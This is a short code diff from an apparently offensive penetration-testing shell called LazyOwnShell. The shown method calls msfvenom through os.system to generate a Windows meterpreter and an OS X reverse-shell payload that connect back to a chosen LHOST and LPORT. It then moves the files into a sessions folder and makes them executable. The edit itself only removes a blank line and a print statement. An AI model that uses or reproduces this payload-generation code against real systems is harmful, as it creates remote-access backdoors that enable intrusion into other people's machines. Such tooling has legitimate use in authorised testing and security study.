@@ -674,13 +674,12 @@ class LazyOwnShell(Cmd):
         os.system(
             f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell.exe'
         )
-        
         os.system(
             f'msfvenom -p osx/x86/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell.macho'
         )
         
         print(f"[*] LHOST={lhost} LPORT={lport}")
-        print(result)
+        
         os.system("mv shell.* sessions")
         os.system("chmod +x sessions/*")
         print("[*] Lazy MSFVenom Reverse_shell payloads in sessions/ ")
